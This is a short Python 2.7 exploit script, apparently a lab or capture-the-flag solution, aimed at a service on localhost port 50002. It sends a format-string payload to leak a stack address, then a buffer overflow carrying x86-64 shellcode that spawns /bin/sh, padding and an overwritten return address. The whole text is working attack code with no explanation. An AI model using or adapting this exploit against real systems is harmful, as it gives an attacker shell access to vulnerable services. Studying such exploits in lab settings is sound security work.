#!/usr/bin/env python2.7

import socket
import struct
import time
import subprocess
import re

TARGET_IP = '127.0.0.1'
TARGET_PORT = 50002

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))

BAD_STRING="%1$p\n"
s.send(BAD_STRING)
time.sleep(0.2)
REC=s.recv(1024)
BASE_ADDR=re.search('\d.*',REC)
print(BASE_ADDR.group(0))

OFFSET=503
ADDRESS=int(BASE_ADDR.group(0), 16)+OFFSET
TARGET=struct.pack('L',ADDRESS)
print(hex(ADDRESS))

JUNK = "A"*302
SHELLCODE = "\x48\x31\xc0\x48\x83\xc0\x3b\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\xff\x48\xc1\xe7\x08\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05"
BUFFER = SHELLCODE + JUNK + TARGET + "\n"

s.send(BUFFER)
s.close()
